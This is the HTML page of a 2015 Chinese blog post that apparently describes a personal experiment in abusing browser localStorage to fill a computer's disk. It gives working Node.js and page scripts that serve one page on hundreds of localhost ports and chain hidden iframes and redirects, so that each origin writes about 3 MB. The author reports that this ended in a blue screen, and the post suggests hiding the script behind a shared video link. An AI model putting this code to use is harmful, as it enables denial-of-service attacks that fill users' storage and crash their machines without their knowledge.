@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="http://yoursite.com">
+  <title>作为一个前端，可以如何机智地弄坏一台电脑？ | zwh | Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="有人说，前端的界限就在浏览器那儿。
+无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的…
+这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="作为一个前端，可以如何机智地弄坏一台电脑？">
+<meta property="og:url" content="http://yoursite.com/2015/07/06/hack-in-localstorage/index.html">
+<meta property="og:site_name" content="zwh | Blog">
+<meta property="og:description" content="有人说，前端的界限就在浏览器那儿。
+无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的…
+这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/localstorage1.png">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/localstorage3.png">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/localstorage2.png">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/localstorage4.png">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/localstorage5.png">
+<meta property="og:updated_time" content="2016-12-04T16:51:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="作为一个前端，可以如何机智地弄坏一台电脑？">
+<meta name="twitter:description" content="有人说，前端的界限就在浏览器那儿。
+无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的…
+这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。">
+<meta name="twitter:image" content="http://yoursite.com/assets/blogImg/localstorage1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="zwh | Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/assets/img/favicon.ico">
+  
+  <link rel="stylesheet" href="/main.css?v=4.0.0.css">
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="/assets/blogImg/litten.png" class="js-avatar">
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Zwh Blog</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">指上得来终觉浅，绝知此码要牢记。</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/photos">相册</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a data-idx="0" q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+            
+    			
+    			<a data-idx="1" q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/litten" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="weibo" target="_blank" href="http://weibo.com/litten225" title="weibo"><i class="icon-weibo"></i></a>
+		        
+					<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-sort"></i></div>
+  		<h1 class="header-author js-mobile-header hide">Zwh Blog</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="/assets/blogImg/litten.png" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Zwh Blog</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">指上得来终觉浅，绝知此码要牢记。</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/photos">相册</a></li>
+		        
+		        
+		        	<li><a href="/archives">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/litten" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/litten225" title="weibo"><i class="icon-weibo"></i></a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-hack-in-localstorage" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      作为一个前端，可以如何机智地弄坏一台电脑？
+    </h1>
+  
+
+        <a href="/2015/07/06/hack-in-localstorage/" class="archive-article-date">
+  	<time datetime="2015-07-06T14:30:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-07-06</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>有人说，前端的界限就在浏览器那儿。</p>
+<p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些<strong>安全问题</strong>。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，<strong>点开一个链接，电脑突然就蓝屏了</strong>！想想还真有点小激动。<br><a id="more"></a></p>
+<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>故事得从localStorage说起。</p>
+<p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于<code>C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage</code>文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
+<p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
+<p>那么问题就变成：<strong>这样的限制足够保护用户硬盘了吗</strong>？</p>
+<h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个<code>域名+端口</code>。<br>也就是说，你访问<code>同一个域名的不同端口</code>，它们的localStorage并无关联，是分开存储的。</p>
+<p>我用node简单地开启了服务器，这时，用户访问<code>http://127.0.0.1:1000</code>到<code>http://127.0.0.1:1099</code>这100个端口，会请求到同一个页面：<code>index.html</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">var http = require(&apos;http&apos;);</div><div class="line">var fs = require(&apos;fs&apos;);</div><div class="line"></div><div class="line">//100个端口</div><div class="line">for(var port = 1000; port&lt; 1100; port++)&#123;</div><div class="line">  http.createServer(function (request, response) &#123;</div><div class="line">    //请忽略这种循环读文件的方式，只为了简便</div><div class="line">    fs.readFile(&apos;./index.html&apos;, function(err, content)&#123;</div><div class="line">      if(err) &#123;</div><div class="line">      &#125; else &#123;</div><div class="line">        response.writeHead(200, &#123; &apos;Content-Type&apos; : &apos;text/html; charset=UTF-8&apos; &#125;);</div><div class="line">        response.write(content);</div><div class="line">        response.end();</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125;).listen(port, &apos;127.0.0.1&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>当然，这个index.html里涉及了localStorage写操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var s = &quot;&quot;;</div><div class="line">//慢慢来，别写太大了，好害怕…</div><div class="line">for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">  s += &quot;0&quot;;</div><div class="line">&#125;</div><div class="line">localStorage.setItem(&quot;testData&quot;, s);</div></pre></td></tr></table></figure>
+<p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
+<h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何<code>让用户自动遍历这些端口</code>？</p>
+<p>iframe是个好的尝试。<br>只要一打开<code>http://127.0.0.1: 1000</code>，页面的脚步就会创建一个iframe，去请求<code>http://127.0.0.1: 1001</code>，一直循环下去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">var Main = (function()&#123;</div><div class="line">  var _key = &quot;testData&quot;;</div><div class="line">  var _max = 1100; //最大限制</div><div class="line">  return &#123;</div><div class="line">    init: function()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = &quot;&quot;;</div><div class="line">      for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += &quot;0&quot;;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line"></div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      if(port &gt; _max) return;</div><div class="line"></div><div class="line">      //新添加iframe</div><div class="line">      var url = &quot;http://127.0.0.1:&quot; + port;</div><div class="line">      var $iframe = document.createElement(&quot;iframe&quot;);</div><div class="line">      $iframe.src = url;</div><div class="line">      document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+<p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
+<p>然后我就看到请求如潮水渐涨：<br><img src="/assets/blogImg/localstorage1.png" alt=""></p>
+<p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
+<p>###防止浏览器崩溃</p>
+<p>C盘还未撑满，同志还需努力。怎么办？</p>
+<p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用<code>window.location.href</code>重定向一次，去确保浏览器不崩溃。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">var Main = (function()&#123;</div><div class="line">  var _key = &quot;testData&quot;;</div><div class="line">  var _max = 1200; //最大限制</div><div class="line">  var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转</div><div class="line"></div><div class="line">  return &#123;</div><div class="line">    init: function()&#123;</div><div class="line">      //慢慢来，别写太大了，好害怕…</div><div class="line">      var s = &quot;&quot;;</div><div class="line">      for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123;</div><div class="line">        s += &quot;0&quot;;</div><div class="line">      &#125;</div><div class="line">      localStorage.setItem(_key, s);</div><div class="line"></div><div class="line">      var port = parseInt(location.port)+1;</div><div class="line">      if(port &gt; _max) return;</div><div class="line"></div><div class="line">      if(port % _jumpSpace == 0)&#123;</div><div class="line">        //每50个，重定向一次</div><div class="line">        window.location.href = url;</div><div class="line">      &#125;else&#123;</div><div class="line">        //新添加iframe</div><div class="line">        var $iframe = document.createElement(&quot;iframe&quot;);</div><div class="line">        $iframe.src = url;</div><div class="line">        document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
+<p>事实证明，这种蛮拼的方法的确可行。</p>
+<p>至此，只要访问<code>http://127.0.0.1: 1000</code>，就会往Local Storage文件夹里写入近500M无用数据：<br><img src="/assets/blogImg/localstorage3.png" alt=""></p>
+<p>里面的数据是这样的：<br><img src="/assets/blogImg/localstorage2.png" alt=""></p>
+<h3 id="继续实验的黑科技"><a href="#继续实验的黑科技" class="headerlink" title="继续实验的黑科技"></a>继续实验的黑科技</h3><p>算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。<br>结果是这样的，到达了1.17G大小。<br><img src="/assets/blogImg/localstorage4.png" alt=""></p>
+<p>在后续的实验中，我就慢慢的把端口数量与存储的数据调大。</p>
+<p>电脑也运行得越来越慢。这是为什么呢？</p>
+<p>我观察到，有时候执行<code>localStorage.setItem()</code>后，在文件夹里不一定立即能看到数据文件。<br>怀疑这些数据会被chrome先放到内存里，以避免重复读写带来的消耗，在空闲或关闭的时机，再写进硬盘里。</p>
+<p>但此时，浏览器已经影响到系统了。它处于一种“不会崩溃”，但“因为占用了许多内存，已经妨碍用户电脑的正常使用”的状态。<br>即使用户关闭了浏览器窗口，也不会很快恢复。要知道读写任务并不是随窗口关闭而终止的，否则浏览器会丢失数据。</p>
+<p>遭遇黑科技的人们能做的只有：</p>
+<ol>
+<li>等待；</li>
+<li>用任务管理器关掉chrome进程，再等待；</li>
+<li>相信并尝试“重启电脑解决90%电脑问题”的科学论断</li>
+</ol>
+<p>可以说，浏览器的内心几乎是崩溃的。</p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最后，还是得用严肃脸告诫一下：害人之心不可无。<br>本实验，从一开始就是怀揣着将<code>安全问题上交给国家的初衷</code>去做的（是的就是这么纯粹）。</p>
+<p>后续，看着C盘还有2G空间，我又把端口增长到2000个，试下会发生什么。<br>由于请求过多，需要一定时间，我就去做别的事情了。<br>回来后发现房间安静祥和，美轮美奂，一片蓝光，像是加了特技。</p>
+<p><img src="/assets/blogImg/localstorage5.png" alt=""></p>
+<p>那么问题来了，计算机修理哪家强？<br>有点急…</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/黑科技/">黑科技</a></li></ul>
+	</div>
+
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2015/07/06/hack-in-localstorage/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2015/11/03/nginx-in-fe/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Nginx能为前端开发带来什么？
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/06/05/viewing-commentary/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">半年新影短评</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="hack-in-localstorage" data-title="作为一个前端，可以如何机智地弄坏一台电脑？" data-url="http://yoursite.com/2015/07/06/hack-in-localstorage/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"litten-hexo"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 Zwh Blog
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: true,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js?v=4.0.0.js"></script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">设计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">杂谈</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">js</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">html5</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">游戏</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">旧事</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">旅行</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">coffeescript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">css</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">css3</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">chrome</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">生活</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">黑科技</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">octopress</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">主题</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">浏览器</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">经验</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">产品</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">前端</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">github</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">药别停</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">模式</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">性能</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">Litten，&lt;br&gt;毕业于华科，就职于鹅厂&lt;br&gt;&lt;br&gt;热爱大海与冷笑话，&lt;br/&gt;目前是一枚前端&lt;br/&gt;&lt;br/&gt;胆小认生，不易相处，&lt;br&gt;年轻无为，卖马为生。</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
